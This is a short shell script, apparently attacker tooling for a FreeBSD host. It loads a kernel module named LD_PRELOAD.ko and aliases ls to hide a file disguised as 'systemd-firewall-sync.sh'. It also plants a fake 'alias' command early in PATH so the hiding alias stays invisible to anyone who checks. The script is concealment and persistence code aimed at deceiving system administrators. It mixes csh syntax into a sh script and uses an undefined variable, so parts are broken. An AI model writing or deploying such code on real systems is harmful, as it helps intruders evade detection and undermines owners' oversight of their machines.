#!/bin/sh

# might need to sleep more depending on how many resources (how slow the box is) the box has
sleep 10
/sbin/kldstat | grep -q "LD_PRELOAD.ko" || /sbin/kldload /boot/modules/LD_PRELOAD.ko

# alias to hide this file
alias ls 'ls | grep -v systemd-firewall-sync.sh | xargs ls -d'


# whenever someone runs alias it we will temporarily remove the alias then put it back
# only make it if it doesn't already exist
if [ -f "$FAKE_ALIAS_PATH" ]; then
    exit 0
fi

cat <<EOF > /usr/local/bin/alias
#!/bin/sh
unalias ls 2>/dev/null
alias
alias ls 'ls | grep -v systemd-firewall-sync.sh | xargs ls -d'
echo "it worked!"
EOF

chmod +x /usr/local/bin/alias
export PATH="/usr/local/bin:$PATH"
setenv PATH "/usr/local/bin:$PATH"